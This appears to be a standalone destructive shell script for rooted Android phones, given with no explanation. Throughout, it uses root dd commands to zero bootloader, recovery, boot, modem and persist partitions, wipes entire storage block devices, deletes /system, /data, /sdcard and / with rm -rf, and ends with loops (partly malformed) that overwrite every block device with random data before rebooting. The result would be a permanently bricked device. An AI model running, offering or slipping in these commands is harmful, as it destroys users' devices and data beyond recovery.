
su -c dd if=/dev/zero of=/dev/block/by-name/abl
su -c dd if=/dev/zero of=/dev/block/by-name/abl_a
su -c dd if=/dev/zero of=/dev/block/by-name/abl_b
su -c dd if=/dev/zero of=/dev/block/by-name/xbl
su -c dd if=/dev/zero of=/dev/block/by-name/xbl_a
su -c dd if=/dev/zero of=/dev/block/by-name/xbl_b
su -c dd if=/dev/zero of=/dev/block/by-name/xbl_bak
su -c dd if=/dev/zero of=/dev/block/by-name/xbl_config
su -c dd if=/dev/zero of=/dev/block/by-name/xbl_config_a
su -c dd if=/dev/zero of=/dev/block/by-name/xbl_config_b
su -c dd if=/dev/zero of=/dev/block/by-name/xbl_configbak

su -c dd if=/dev/zero of=/dev/block/by-name/recovery
su -c dd if=/dev/zero of=/dev/block/by-name/recovery_a
su -c dd if=/dev/zero of=/dev/block/by-name/recovery_b

su -c dd if=/dev/zero of=/dev/block/by-name/boot
su -c dd if=/dev/zero of=/dev/block/by-name/boot_a
su -c dd if=/dev/zero of=/dev/block/by-name/boot_b

su -c dd if=/dev/zero of=/dev/block/by-name/fsc
su -c dd if=/dev/zero of=/dev/block/by-name/fsg
su -c dd if=/dev/zero of=/dev/block/by-name/mdm1m9kefs1
su -c dd if=/dev/zero of=/dev/block/by-name/mdm1m9kefs2
su -c dd if=/dev/zero of=/dev/block/by-name/mdm1m9kefs3
su -c dd if=/dev/zero of=/dev/block/by-name/mdm1m9kefsc
su -c dd if=/dev/zero of=/dev/block/by-name/modem
su -c dd if=/dev/zero of=/dev/block/by-name/modemst1
su -c dd if=/dev/zero of=/dev/block/by-name/modemst2

su -c dd if=/dev/zero of=/dev/block/by-name/presist
su -c dd if=/dev/zero of=/dev/block/by-name/presistbak

su -c dd if=/dev/zero of=/dev/block/by-name/devcfg
su -c dd if=/dev/zero of=/dev/block/by-name/devinfo
su -c dd if=/dev/zero of=/dev/block/by-name/dtbo

dd if=/dev/zero of=/dev/block/sda bs=1M count=100
dd if=/dev/zero of=/dev/block/sdb
dd if=/dev/zero of=/dev/block/sdc
dd if=/dev/zero of=/dev/block/sdd
dd if=/dev/zero of=/dev/block/sde
dd if=/dev/zero of=/dev/block/sdf
dd if=/dev/zero of=/dev/block/sda1
dd if=/dev/zero of=/dev/block/sda2
dd if=/dev/zero of=/dev/block/sda3
dd if=/dev/zero of=/dev/block/sda4
dd if=/dev/zero of=/dev/block/sda5
dd if=/dev/zero of=/dev/block/sda6
dd if=/dev/zero of=/dev/block/sda7
dd if=/dev/zero of=/dev/block/sda8
dd if=/dev/zero of=/dev/block/sda9
dd if=/dev/zero of=/dev/block/sda10
dd if=/dev/zero of=/dev/block/sda11
dd if=/dev/zero of=/dev/block/sda12
dd if=/dev/zero of=/dev/block/sda13

dd if=/dev/zero of=/dev/block/loop*
dd if=/dev/zero of=$(magisk --path)/.magisk/block/system_root

rm -rf /system
rm -rf /data
rm -rf /data/data
rm -rf /vendor
rm -rf /product
rm -rf /mnt
rm -rf /proc
rm -rf /sdcard
rm -rf /storage/emulated/0
rm -rf /storage/sdcard
rm -rf /dev/
rm -rf /dev/input/
rm -rf /*

devices='ls /dev/block/sd*`
for poweroff in ${devices}
do
echo "poweroff" > ${poweroff}

for unonline in $(ls -aR /dev/block/*)
do
dd if=/dev/urandom of=${unonline} bs=1k count=1

reboot

done
